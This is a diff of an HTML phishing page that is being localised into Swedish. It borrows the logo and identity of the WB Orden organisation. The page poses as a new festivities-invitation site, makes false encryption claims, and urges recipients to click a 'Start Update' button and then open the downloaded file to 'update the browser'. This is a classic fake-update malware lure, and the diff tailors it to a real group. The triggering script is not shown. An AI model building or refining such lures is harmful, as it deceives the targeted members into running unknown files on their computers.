@@ -50,11 +50,11 @@
 <body>
     <div class="container">
                 <!-- Logotypen visas här -->
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTzA88DBqBxcQel34LqvIm-yuGKIw0mo1VKqA&s" alt="WB Orden Logotyp" class="logo">
-        <p>Hello fellow twinks,</p>
-        <p>We have now launched a new site dedicated to invitations to festivities. To ensure a secure and seamless experience, we use <strong>HTTPS with AES-256 encryption</strong>.</p>
-<p>To access the new site, you need to update your browser to the latest version. Click the button below to start the update, then go to the latest downloads in the data and click on the file to complete the update.</p>
-        <button class="button" onclick="startUpdate()">Start Update</button>
+        <img src="https://wb-orden.se/wp-content/uploads/2020/04/cropped-cropped-WB-loggga-LLV.jpg" alt="WB Orden Logotyp" class="logo">
+        <p>Hej Bröder,</p>
+        <p>Vi har nu lanserat en ny sida dedikerad för inbjudningar till festligheter. För att säkerställa en säker och smidig upplevelse använder vi <strong>HTTPS med AES-256-kryptering</strong>.</p>
+        <p>För att komma åt den nya sidan behöver du uppdatera din webbläsare till den senaste versionen. Klicka på knappen nedan för att starta uppdateringen, sedan går du till senaste nerladdningar i datan och klickar på filen för att slutföra uppdateringen.</p>
+        <button class="button" onclick="startUpdate()">Starta Uppdatering</button>
     </div>
 
     <script>
